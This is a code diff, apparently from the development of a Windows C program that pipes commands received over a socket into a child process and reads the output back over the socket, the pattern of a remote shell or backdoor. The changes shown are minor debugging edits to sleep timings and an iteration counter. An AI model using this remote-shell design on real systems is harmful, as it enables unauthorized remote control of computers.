@@ -9,7 +9,7 @@
 #pragma comment (lib, "Ws2_32.lib")
 
 void CreateChildProcess(PROCESS_INFORMATION *pi);
-void WriteToPipe(const char *command);
+void WriteToPipe(const char *recvserver);
 void ReadFromPipe(SOCKET sock);
 
 HANDLE hRead_in = NULL;
@@ -63,7 +63,7 @@ int main() {
 
        
         WriteToPipe(recvserver);
-        Sleep(300);
+        Sleep(1000);
         ReadFromPipe(sock);
     }
     
@@ -111,6 +111,8 @@ void ReadFromPipe(SOCKET sock) {
     char tempbuf[4096]; 
     DWORD bytesAvailable;
     int totalBytes = 0;
+    int itteration;
+    itteration = 0;
 
     memset(chBuf, 0, sizeof(chBuf));
    
@@ -125,6 +127,7 @@ void ReadFromPipe(SOCKET sock) {
         memset(tempbuf, 0, sizeof(tempbuf)); 
 
         ReadFile(hRead_out, tempbuf, sizeof(tempbuf) - 1, &dwRead, NULL);
+        printf("%s itteration : %d",tempbuf,itteration);
         if (dwRead == 0) break;
 
         tempbuf[dwRead] = '\0';
@@ -136,7 +139,8 @@ void ReadFromPipe(SOCKET sock) {
             break;
         }
         
-        Sleep(100);
+        Sleep(1000);
+        itteration++;
     }
 
     if (totalBytes > 0) {
